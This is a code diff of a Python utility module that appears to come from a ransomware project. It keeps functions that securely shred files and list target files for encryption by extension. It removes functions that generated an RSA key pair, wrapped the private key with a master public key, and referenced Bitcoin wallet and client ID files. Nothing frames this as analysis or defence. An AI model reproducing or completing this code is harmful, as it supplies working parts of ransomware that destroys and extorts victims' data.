@@ -1,43 +1,55 @@
 import logging
-import hashlib
-import uuid
-from random import randint
+import pickle
 from os import urandom, remove, path, listdir
-from core.crypto.asymmetric_encryption import RSA
-from .config import (
-    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
-    MASTER_PUBLIC_KEY,
-    ENCRYPTED_BITCOIN_KEY_LOCATION,
-    BITCOIN_WALLET_ID_PATH,
-    REQUIRED_FILE_FORMAT,
-    CLIENT_ID_LOCATION
-)
-from pickle import load, dump, HIGHEST_PROTOCOL
+from random import randint
+from core.config import REQUIRED_FILE_FORMAT
 
 logger = logging.getLogger(__name__)
 
+
 def write_data_to_file(file_path, data, serialized=True):
+    """Writes data to file, in some cases serializes objects before writing them to a file
+
+    Args:
+        file_path (str): The absolute path of the file to be written
+        data (bytes, obj): The data can be bytes or objects
+        serialized (bool, optional): Flag to determine whether to serialize objects or write them directly. Defaults to True.
+    """
     logger.info(f"Writing data to {file_path}")
     file = open(file_path, "wb")
     if serialized:
         file.write(data)
     else:
-        dump(data, file, HIGHEST_PROTOCOL)
+        pickle.dump(data, file, pickle.HIGHEST_PROTOCOL)
     file.close()
 
 
 def read_data_from_file(file_path, serialized=True):
+    """Reads data from a file and loads the objects, if present 
+
+    Args:
+        file_path (str): The absolute path of the file to read data from
+        serialized (bool, optional): Flag to determine if the data needs to be deserialized. Defaults to True.
+
+    Returns:
+        byte: Data from the file
+    """
     logger.info(f"Reading data from {file_path}")
     file = open(file_path, "rb")
     if serialized:
         file_data = file.read()
     else:
-        file_data = load(file)
+        file_data = pickle.load(file)
     file.close()
     return file_data
 
 
 def shred_file(file_path):
+    """Overwrites original data multiple times before deleting it
+
+    Args:
+        file_path (str): The absolute file path to be deleted
+    """
     logger.info(f"Shredding file {file_path}")
     with open(file_path, "ab+") as file_to_be_deleted:
         length = file_to_be_deleted.tell()
@@ -54,32 +66,15 @@ def shred_file(file_path):
     remove(file_path)
 
 
-def generate_rsa_key_pair():
-    logger.info("Generating RSA key pair")
-    cipher = RSA()
-    serialized_private_key = cipher.private_key
-    serialized_public_key = cipher.public_key
-
-    logger.info("Encrypting RSA private key")
-    cipher = RSA(public_key=MASTER_PUBLIC_KEY)
-    encrypted_private_key = cipher.encrypt_large_data(serialized_private_key)
-
-    logger.info("Storing encrypted RSA private key in disk")
-    write_data_to_file(
-        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, encrypted_private_key, False
-    )
-
-    return serialized_public_key
-
-def get_client_id():
-    if path.exists(CLIENT_ID_LOCATION):
-        client_id = read_data_from_file(CLIENT_ID_LOCATION).decode()
-    else:
-        client_id = str(uuid.uuid4())
-        write_data_to_file(CLIENT_ID_LOCATION, client_id.encode())
-    return client_id
-
 def get_files_to_be_encrypted(directory):
+    """Generates the list of files to be encrypted
+
+    Args:
+        directory (list): list of all absolute file paths to be encrypted
+
+    Returns:
+        [type]: [description]
+    """
     logger.info(f"Discovering files in {directory}")
     files_to_encrypted = [
         f"{directory}/{file}"
@@ -87,4 +82,3 @@ def get_files_to_be_encrypted(directory):
         if path.splitext(f"{directory}/{file}")[1].upper() in REQUIRED_FILE_FORMAT
     ]
     return files_to_encrypted
-
